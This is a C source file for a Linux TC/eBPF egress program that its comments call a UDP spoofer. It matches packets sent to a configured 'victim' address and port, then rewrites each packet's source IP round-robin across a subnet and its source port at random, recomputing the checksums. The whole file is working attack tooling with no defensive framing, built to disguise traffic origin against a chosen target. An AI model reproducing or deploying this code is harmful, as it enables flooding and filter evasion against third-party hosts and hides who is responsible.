// SPDX-License-Identifier: GPL-2.0
// Minimal TC/eBPF UDP spoofer: round-robin src IP in a subnet + random src port.
// Attach on egress. Targets IPv4/UDP packets matching victim daddr:port.

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>
#include <linux/in.h>
#include <linux/pkt_cls.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/udp.h>

struct cfg_t {
    __be32 victim_ip;     // network order
    __be16 victim_port;   // network order
    __be16 attacker_port; // network order (0 = ignore)
    __be32 first_ip;      // first host IP in subnet, network order
    __u32  host_cnt;      // number of hosts in subnet
} __attribute__((packed));

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, struct cfg_t);
    // tc/libbpf will pin maps here automatically:
    __uint(pinning, LIBBPF_PIN_BY_NAME);
} spoof_cfg SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u32);
    __uint(pinning, LIBBPF_PIN_BY_NAME);
} spoof_rr SEC(".maps");

static __always_inline int parse_l3_l4(void *data, void *data_end,
                                       struct iphdr **iph, struct udphdr **udph)
{
    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end) return -1;
    if (eth->h_proto != bpf_htons(ETH_P_IP)) return -1;

    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end) return -1;
    if (ip->protocol != IPPROTO_UDP) return -1;

    __u32 ihl = ip->ihl * 4;
    if (ihl < sizeof(*ip)) return -1;

    struct udphdr *udp = (void *)ip + ihl;
    if ((void *)(udp + 1) > data_end) return -1;

    *iph = ip;
    *udph = udp;
    return 0;
}

SEC("classifier/cls_main")
int cls_main(struct __sk_buff *skb)
{
    // Make sure headers are linear and accessible
    if (bpf_skb_pull_data(skb, ETH_HLEN + sizeof(struct iphdr) + sizeof(struct udphdr)) < 0)
        return BPF_OK;

    void *data = (void *)(long)skb->data;
    void *data_end = (void *)(long)skb->data_end;
    struct iphdr *iph; struct udphdr *udph;
    if (parse_l3_l4(data, data_end, &iph, &udph) < 0)
        return BPF_OK;

    __u32 k = 0;
    struct cfg_t *cfg = bpf_map_lookup_elem(&spoof_cfg, &k);
    if (!cfg) return BPF_OK;

    // Filter: victim daddr + dport (and optional attacker sport)
    if (iph->daddr != cfg->victim_ip) return BPF_OK;
    if (udph->dest != cfg->victim_port) return BPF_OK;
    if (cfg->attacker_port && udph->source != cfg->attacker_port) return BPF_OK;

    // --- Compute new spoofed source IP (round-robin) ---
    __u32 *rr = bpf_map_lookup_elem(&spoof_rr, &k);
    __u32 seq = 0;
    if (rr) {
        // Atomic add on map value. clang/llvm rejects using the XADD return value for BPF,
        // so perform the atomic add and then read the value.
        __atomic_add_fetch(rr, 1, __ATOMIC_RELAXED);
        seq = *rr;
    }
    __u32 host_cnt = cfg->host_cnt ? cfg->host_cnt : 1;
    __u32 offset = seq % host_cnt;

    // first_ip is network order; do math in host order, convert back
    __u32 first_h = bpf_ntohl(cfg->first_ip);
    __be32 new_saddr = bpf_htonl(first_h + offset);

    // --- Random ephemeral UDP source port 49152..65535 (16384 values) ---
    __u16 rnd = (bpf_get_prandom_u32() & 0x3FFF); // 0..16383
    __be16 new_sport = bpf_htons(49152 + rnd);

    // Save old fields
    __be32 old_saddr = iph->saddr;
    __be16 old_sport = udph->source;

    // Offsets
    const __u32 ip_off   = ETH_HLEN;
    const __u32 l4_off   = ip_off + iph->ihl * 4;
    const __u32 ip_csum  = ip_off + offsetof(struct iphdr, check);
    const __u32 ip_saddr = ip_off + offsetof(struct iphdr, saddr);
    const __u32 udp_csum = l4_off + offsetof(struct udphdr, check);
    const __u32 udp_sport= l4_off + offsetof(struct udphdr, source);

    // Update IPv4 header checksum + saddr
    bpf_l3_csum_replace(skb, ip_csum, old_saddr, new_saddr, sizeof(new_saddr));
    bpf_skb_store_bytes(skb, ip_saddr, &new_saddr, sizeof(new_saddr), 0);

    // Update UDP checksum for saddr change (pseudo header)
    bpf_l4_csum_replace(skb, udp_csum, old_saddr, new_saddr, BPF_F_PSEUDO_HDR | sizeof(old_saddr));

    // Update UDP checksum for sport change, then write sport
    bpf_l4_csum_replace(skb, udp_csum, old_sport, new_sport, sizeof(old_sport));
    bpf_skb_store_bytes(skb, udp_sport, &new_sport, sizeof(new_sport), 0);

    return BPF_OK;
}

char _license[] SEC("license") = "GPL";
